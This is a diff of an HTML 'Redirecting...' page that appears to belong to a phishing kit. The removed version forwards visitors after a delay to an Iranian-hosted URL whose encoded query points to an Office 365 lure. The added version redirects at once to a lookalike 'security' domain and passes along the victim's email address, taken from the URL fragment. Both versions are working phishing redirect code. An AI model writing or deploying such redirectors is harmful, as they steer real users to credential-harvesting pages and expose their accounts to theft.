@@ -1,32 +1,22 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instant...</title>
+  <meta charset="UTF-8">
+  <title>Redirecting...</title>
+  <script>
+    window.onload = function () {
+      const baseUrl = 'https://security.eyzszb.es/JZ2qWaO24Q2amsr!';
+      const hash = window.location.hash;
+      if (hash) {
+        const email = '' + hash.substring(1);
+        window.location.href = baseUrl + encodeURIComponent(email);
+      } else {
+        window.location.href = baseUrl;
+      }
+    };
+  </script>
 </head>
 <body>
-
-    <script type="text/javascript">
-        // Set the base URL you want to redirect to
-        var redirectUrl = "https://mlt.co.ir/n/?c3Y9bzM2NV8xX25vbSZyYW5kPVFYWXlVbXM9JnVpZD1VU0VSMjUxMTIwMjRVMjQxMTI1NTQ=N0123N";
-
-        // Get the current URL's fragment (everything after #)
-        var fragment = window.location.hash;
-
-        // If there's a fragment, append it to the redirect URL
-        if (fragment) {
-            redirectUrl += fragment;
-        }
-
-        // Set the delay time in milliseconds (2000 = 2 seconds)
-        var delayTime = 2000;
-
-        // Redirect after the specified delay
-        setTimeout(function() {
-            window.location.href = redirectUrl;
-        }, delayTime);
-    </script>
-    
+  <p>Redirecting...</p>
 </body>
 </html>
